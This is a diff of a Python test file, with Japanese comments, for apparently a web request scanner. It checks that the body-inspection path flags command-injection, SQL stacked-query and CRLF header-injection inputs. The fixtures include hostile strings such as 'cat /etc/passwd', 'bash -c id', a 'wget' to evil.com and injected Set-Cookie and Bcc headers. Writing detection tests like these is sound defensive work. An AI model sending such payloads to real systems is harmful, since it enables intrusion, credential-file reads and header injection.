@@ -59,14 +59,17 @@ def test_t1_body_semicolon_detections_keep_existing_true_positives():
                        (b"x=1||bash -c id", "rce"),
                        (b"x=1&&wget http://evil.com/x", "rce")):
             assert sh.inspect_body("192.0.2.41", b).get("signature") == sig, b
-    # 本文用の照合は、head の正規化で ';' になった既存の真陽性の形もそのまま拾う
-    body_re = dict(P._SIG_RE_BODY)
-    assert P._stacked_query_suspect(_normalize_for_scan("q%0a%0aselect a from b"), body=True)
-    for s in ("1; cat /etc/passwd", "127.0.0.1%0acat /etc/passwd", "x=1;bash -c id"):
-        assert body_re["rce"].search(_normalize_for_scan(s)), s
-    for s in ("next=%0d%0aSet-Cookie:%20sid=evil", "u=%0d%0aLocation:%20http://e",
-              "x=%0d%0aContent-Type:%20text/html", "to=a%0aBcc:evil@x"):
-        assert body_re["crlf"].search(_normalize_for_scan(s)), s
+        # 値に符号化した改行(head では ';' になる)の後の既存の真陽性も、本文の走査そのもの
+        # (inspect_body と同じ _scan_field(body=True))で拾う(#37: 旧版のこの検査は head の正規化
+        # _normalize_for_scan に本文用の正規表現を当てていて、本文の経路の取りこぼしを隠していた)。
+        # rce は /etc/passwd が先に traversal に当たるので、rce の照合だけを見る。
+        assert sh.inspect_body("192.0.2.42", b"q%0a%0aselect a from b").get("signature") \
+            == "sqli-stacked"
+        for s in ("1; cat /etc/passwd", "127.0.0.1%0acat /etc/passwd", "x=1;bash -c id"):
+            assert sh._scan_field(s, body=True, only=frozenset({"rce"}))[0] == "rce", s
+        for s in (b"next=%0d%0aSet-Cookie:%20sid=evil", b"u=%0d%0aLocation:%20http://e",
+                  b"x=%0d%0aContent-Type:%20text/html", b"to=a%0aBcc:evil@x"):
+            assert sh.inspect_body("192.0.2.43", s).get("signature") == "crlf", s
     # 本文用は head 用の部分集合(名前と並びは同じ・rce/crlf 以外は同じ正規表現)
     assert [n for n, _r in P._SIG_RE_BODY] == [n for n, _r in P._SIG_RE]
     for (n, r1), (_n, r2) in zip(P._SIG_RE, P._SIG_RE_BODY):
